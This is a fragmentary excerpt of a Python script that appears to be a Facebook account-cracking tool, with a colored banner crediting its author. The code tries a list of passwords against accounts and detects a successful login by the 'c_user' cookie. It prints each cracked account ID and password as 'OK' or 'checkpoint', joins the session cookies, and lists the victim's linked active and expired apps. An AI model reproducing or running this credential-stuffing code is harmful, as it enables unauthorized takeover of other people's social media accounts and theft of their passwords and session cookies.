...
def uaku():
	try:
		...
		a=requests.get('https://github.com/FOX-AR').text
		ua=open('.bbnew.txt','w')
...
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mARA
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mABU RAHIAN ANTO
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mhttps://github.com/FOX-AR
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        print(f'\r%s[%s!%s] {GREEN}SORRY NO ACTIVE APKS %s'%(N,M,N,M,N))
    else:
        print(f'\r[%s] {YELLOW}YOUR ACTIVE APPLICATION DETAILS:'%(H))
    ...
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] {RED}SORRY NO EXPIRED APKS %s'%(N,M,N,M,N))
    else:
        print(f'\r[%s] {PURPLE}YOUR EXPIRED APPLICATION DETAILS:'%(M))
        for i in range(len(game)):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[ANTO-OK] '+cid+' | '+ps+'\n[•] Useeagent: '+ua+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[ANTO-CP] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
